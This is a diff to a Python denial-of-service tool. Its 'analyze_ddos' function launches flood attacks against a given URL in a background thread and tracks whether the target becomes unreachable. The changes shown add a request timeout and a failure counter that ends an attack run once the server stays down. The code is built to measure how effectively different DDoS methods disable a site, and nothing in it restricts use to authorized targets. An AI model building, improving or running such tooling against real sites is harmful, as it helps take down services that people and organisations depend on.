@@ -70,7 +70,7 @@ def http_flood(url):
 def measure_response(url):
     try:
         start_time = time.time()
-        response = requests.get(url)
+        response = requests.get(url, timeout=5)  # Add timeout to avoid waiting too long
         end_time = time.time()
         response_time = end_time - start_time
         return response.status_code, response_time
@@ -79,7 +79,7 @@ def measure_response(url):
         return None, None
 
 # Analyzing effectiveness of different DDoS methods
-def analyze_ddos(url, attack_method, method_name, response_times, log_color="yellow"):
+def analyze_ddos(url, attack_method, method_name, response_times, log_color="yellow", max_failures=5):
     print(colored(f"\nStarting {method_name} attack on {url}", log_color))
     
     # Baseline response time without attack
@@ -94,15 +94,26 @@ def analyze_ddos(url, attack_method, method_name, response_times, log_color="yel
     attack_thread.start()
 
     start_time = time.time()
+    failure_count = 0
+
     while time.time() - start_time < attack_duration:
         status, response_time = measure_response(url)
+        
         if status is None:
-            print(colored(f"{method_name}: Server unreachable during attack!", "red"))
+            failure_count += 1
+            print(colored(f"{method_name}: Server unreachable during attack! ({failure_count}/{max_failures})", "red"))
             logging.error(f"{method_name}: Server unreachable during attack!")
         else:
+            failure_count = 0  # Reset failure count if response is successful
             print(colored(f"{method_name}: Response during attack: {response_time:.4f} seconds", log_color))
             logging.info(f"{method_name}: Response time: {response_time:.4f} seconds")
             response_times.append(response_time)
+        
+        # Check if max_failures reached, stop attack if true
+        if failure_count >= max_failures:
+            print(colored(f"{method_name}: Maximum failure limit reached, stopping attack.", "red"))
+            break
+        
         time.sleep(1)  # Wait before next measurement
 
     print(colored(f"{method_name} attack completed.\n", log_color))
